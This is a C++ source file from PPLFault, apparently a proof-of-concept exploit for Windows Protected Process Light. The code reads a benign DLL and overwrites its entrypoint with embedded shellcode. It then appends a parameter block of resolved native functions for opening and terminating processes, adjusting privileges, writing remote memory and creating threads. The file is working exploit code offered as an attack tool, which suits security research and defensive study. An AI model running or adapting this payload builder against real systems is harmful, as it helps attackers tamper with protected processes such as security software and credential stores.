// PPLFault by Gabriel Landau
// https://twitter.com/GabrielLandau

#define _CRT_SECURE_NO_WARNINGS
#include "Payload.h"
#include "GMShellcode.h"
#include "resource.h"
#include "Logging.h"
#include "PayloadUtils.h"
#include <stdio.h>
#include <DbgHelp.h>
#include <string>

bool InitShellcodeParams(
    PSHELLCODE_PARAMS pParams
)
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    HMODULE hWin32U = LoadLibraryW(L"win32u.dll");
    CsrGetProcessId_t pCsrGetProcessId = NULL;
    uint8_t nops[MAGIC_NOPS_LENGTH] = MAGIC_NOPS;

    ZeroMemory(pParams, sizeof(*pParams));

    pParams->magic1 = MAGIC1;
    pParams->magic2 = MAGIC2;

    memcpy(pParams->magicNops, nops, sizeof(nops));

    wcsncpy(pParams->mutexName, BNO MUTEX_NAME_BASE, _countof(pParams->mutexName));
    wcsncpy(pParams->reqName, BNO REQ_NAME_BASE, _countof(pParams->reqName));
    wcsncpy(pParams->doneName, BNO DONE_NAME_BASE, _countof(pParams->doneName));
    wcsncpy(pParams->sectionName, BNO SECTION_NAME_BASE, _countof(pParams->sectionName));

    // IAT
    if (!hNtdll || !hWin32U)
    {
        Log(Error, "Couldn't find kernel32/win32u?  What?");
        return false;
    }

    pCsrGetProcessId = (CsrGetProcessId_t)GetProcAddress(hNtdll, "CsrGetProcessId");
    if (!pCsrGetProcessId)
    {
        Log(Error, "Failed to resolve CsrGetProcessId");
        return false;
    }
    pParams->dwCsrssPid = pCsrGetProcessId();
    //pParams->pThreadObject = FindKTHREAD(dwThreadId);

    Log(Info, "CSRSS PID is %u", pParams->dwCsrssPid);
    //Log(Info, "Elevate TID is %u.  KTHREAD is at %p", dwThreadId, pParams->pThreadObject);

#define REQUIRE_IMPORT(p) if (!(p)) { goto IMPORT_FAILURE; }

    // Target process should already have ntdll and win32u loaded, so we can just pass pointers over
    
    // ntdll
    REQUIRE_IMPORT(pParams->pNtOpenProcess = (NtOpenProcess_t)GetProcAddress(hNtdll, "NtOpenProcess"));
    REQUIRE_IMPORT(pParams->pNtTerminateProcess = (NtTerminateProcess_t)GetProcAddress(hNtdll, "NtTerminateProcess"));
    REQUIRE_IMPORT(pParams->pRtlAdjustPrivilege = (RtlAdjustPrivilege_t)GetProcAddress(hNtdll, "RtlAdjustPrivilege"));
    REQUIRE_IMPORT(pParams->pNtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory"));
    REQUIRE_IMPORT(pParams->pNtWriteVirtualMemory = (NtWriteVirtualMemory_t)GetProcAddress(hNtdll, "NtWriteVirtualMemory"));
    REQUIRE_IMPORT(pParams->pRtlCreateUserThread = (RtlCreateUserThread_t)GetProcAddress(hNtdll, "RtlCreateUserThread"));
    REQUIRE_IMPORT(pParams->pNtWaitForSingleObject = (NtWaitForSingleObject_t)GetProcAddress(hNtdll, "NtWaitForSingleObject"));
    REQUIRE_IMPORT(pParams->pNtCreateMutant = (NtCreateMutant_t)GetProcAddress(hNtdll, "NtCreateMutant"));
    REQUIRE_IMPORT(pParams->pNtCreateEvent = (NtCreateEvent_t)GetProcAddress(hNtdll, "NtCreateEvent"));
    REQUIRE_IMPORT(pParams->pNtSetEvent = (NtSetEvent_t)GetProcAddress(hNtdll, "NtSetEvent"));
    REQUIRE_IMPORT(pParams->pNtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection"));
    REQUIRE_IMPORT(pParams->pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection"));

    // win32u
    REQUIRE_IMPORT(pParams->pNtUserHardErrorControl = (NtUserHardErrorControl_t)GetProcAddress(hWin32U, "NtUserHardErrorControl"));
    REQUIRE_IMPORT(pParams->pNtUserSetInformationThread = (NtUserSetInformationThread_t)GetProcAddress(hWin32U, "NtUserSetInformationThread"));

    return true;

IMPORT_FAILURE:
    Log(Error, "Failed to resolve a payload import");
    return false;
}

// Find DLL entrypoint and overwrite it with shellcode
bool BuildPayload(
    HANDLE hBenignDll, 
    std::string & payloadBuffer)
{
    std::string buf;
    LARGE_INTEGER dllSize = { 0, };
    DWORD dwBytesRead = 0;
    PCHAR pEntrypoint = NULL;
    DWORD bytesWritten = 0;
    SHELLCODE_PARAMS params = { 0, };
    SIZE_T availableSpace = 0;
    const uint8_t magic[] = MAGIC_NOPS;
    DWORD curOffset = 0;

    // Read entire source file into buffer
    SetFilePointer(hBenignDll, 0, NULL, SEEK_SET);
    GetFileSizeEx(hBenignDll, &dllSize);
    buf.resize(dllSize.QuadPart);

    if (!ReadFile(hBenignDll, &buf[0], dllSize.LowPart, &dwBytesRead, NULL) || 
        (dwBytesRead != dllSize.QuadPart))
    {
        Log(Error, "BuildPayload: ReadFile failed with GLE %u", GetLastError());
        return false;
    }

    pEntrypoint = (PCHAR)FindEntrypointVA(buf);
    if (!pEntrypoint)
    {
        return false;
    }

    availableSpace = &buf[buf.size()] - (char*)pEntrypoint;

    // Write magic NOPs
    memcpy(pEntrypoint, magic, sizeof(magic));
    curOffset += sizeof(magic);

    // Overwrite entrypoint with shellcode embedded in our resource section
    if (!WriteShellcode(MAKEINTRESOURCE(RES_PAYLOAD), pEntrypoint + curOffset, availableSpace, bytesWritten))
    {
        return false;
    }
    curOffset += bytesWritten;

    // Create a SHELLCODE_PARAMS and write it after the shellcode
    if (!InitShellcodeParams(&params))
    {
        return false;
    }

    if (pEntrypoint + curOffset + sizeof(params) > buf.data() + buf.size() - 1)
    {
        Log(Error, "Not enough space for SHELLCODE_PARAMS");
        return false;
    }

    params.mySize = curOffset + sizeof(params);

    memcpy((pEntrypoint) + curOffset, &params, sizeof(params));

    payloadBuffer = std::move(buf);

    return true;
}
